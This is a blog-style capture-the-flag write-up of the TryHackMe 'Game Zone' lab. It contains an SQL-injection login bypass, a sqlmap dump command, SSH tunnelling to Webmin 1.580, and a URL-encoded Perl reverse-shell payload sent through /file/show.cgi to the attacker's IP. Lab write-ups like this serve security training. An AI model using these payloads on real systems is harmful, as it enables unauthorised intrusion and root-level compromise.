---
layout: post
title: Game Zone | Writeup
categories: CTF
author: ThelastVvV
date: '2020-07-20 05:00:53 +0000'
tags:
  - CTF
  - CyberSecurity
  - TryHackMe
published: true
---

- [Game Zone](#game-zone)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Reverse SSH tunnels](#reverse-ssh-tunnels)
- [Reverse shell](#reverse-shell)
- [Root Flag](#root-flag)


<!-- toc -->


### Game Zone 
Hallå gubbar , I'm a big fan of  Sql injection vulnerabilities  and i 'm in love with Sqlmap  for ages and we are lucky to have this box to work on not hard at all and very easy if you follow up carefully .
try it out at [Game Zone](https://tryhackme.com/room/gamezone)






### Enumeration
Nmap scan & Results:
```sh
nmap -sV -p- -vv BoxIP
```

`22/tcp open ssh`
`80/tcp open http`


so we have and web server and ssh services running so lets go to 
```sh
http://Ip-Box:80/
```


### Exploitation
we will find a login with Agent-47 image which is vulnerable to auth sql injection


Try this to bypass


USERNAME: `admin' or '1' = '1'; -- -` 

PASSWORD: `vvv`


After login we can see that we have a search bar  (after trying other injection commands) we can confirm that it also vulnerable to sql injection in the "searchitem "id parameter 


Now we can jump to sqlmap to dump data

What we need ?

1. Get request 
2. Request file
3. Sqlmap

results : `userpass`


Command:
```sh
sqlmap -r dirofrequest.txt  --dbms=mtsql --dump
```


Options | Meaning |
--- | --- | 
-r| uses the intercepted request 
--dbms | type of database
--dump| dump all data

![alt text](https://thelastvvv.github.io/images/posts/4/requestsql.png "THM")


![alt text](https://thelastvvv.github.io/images/posts/4/sqlagent.png "THM")


To crack the hash use any offline tools or online services 

### Reverse SSH tunnels
so as we find earlier that we have a ssh service we will try to login with same credentials


this command :
```sh
sshpass -p Password ssh -l Username Box-Ip 
```

then run this command:
```sh
ss -tulpn
```

`ss` to investigate sockets running on the host


we find that there's `5 TCP socket` running and `1000 port` is blocked via firewall rules

so now let try to kill processes using `Ctrl+Z`


then re-login to ssh using this command:
```sh
 ssh -L 10000:localhost:10000  Username@Box-Ip
```
![alt text](https://thelastvvv.github.io/images/posts/4/localhost.png "THM")



User Flag:


![alt text](https://thelastvvv.github.io/images/posts/4/flag1.png "THM")



then go to
```sh
http://localhost:10000/
```
and just login with same credentials

![alt text](https://thelastvvv.github.io/images/posts/4/webminversion.png "THM")


CMS Webmin version `1.580`

### Reverse shell

Use searchsploit `webmin`

[https://www.exploit-db.com/exploits/21851
](https://www.exploit-db.com/exploits/21851
)


We have two option to exploited either metasploit or manual ...

go manual for faster results

```ruby


'Name'           => 'Webmin /file/show.cgi Remote Command Execution',
			'Description'    => %q{
					This module exploits an arbitrary command execution vulnerability in Webmin
				1.580. The vulnerability exists in the /file/show.cgi component and allows an
				authenticated user, with access to the File Manager Module, to execute arbitrary
				commands with root privileges. The module has been tested successfully with Webim
				1.580 over Ubuntu 10.04.
res = send_request_cgi(
			{
				'uri'     => "/file/show.cgi/bin/#{rand_text_alphanumeric(rand(5) + 5)}|#{command}|",
				'cookie'  => "sid=#{session}"
			}, 25)

```

```sh
http://localhost:1000/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|#{command}|
```
```sh
http://localhost:1000/file/show.cgi/bin/#{rand_text_alphanumeric(5)}|perl%20-e%20'use%20Socket;$i=%22Your-ip%22;$p=Your-PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(%22tcp%22));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,%22%3E&S%22);open(STDOUT,%22%3E&S%22);open(STDERR,%22%3E&S%22);exec(%22/bin/sh%20-i%22);};'%20|
```
[http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

### Root Flag


![alt text](https://thelastvvv.github.io/images/posts/4/flagroot.png "THM")




The end ...see you next time




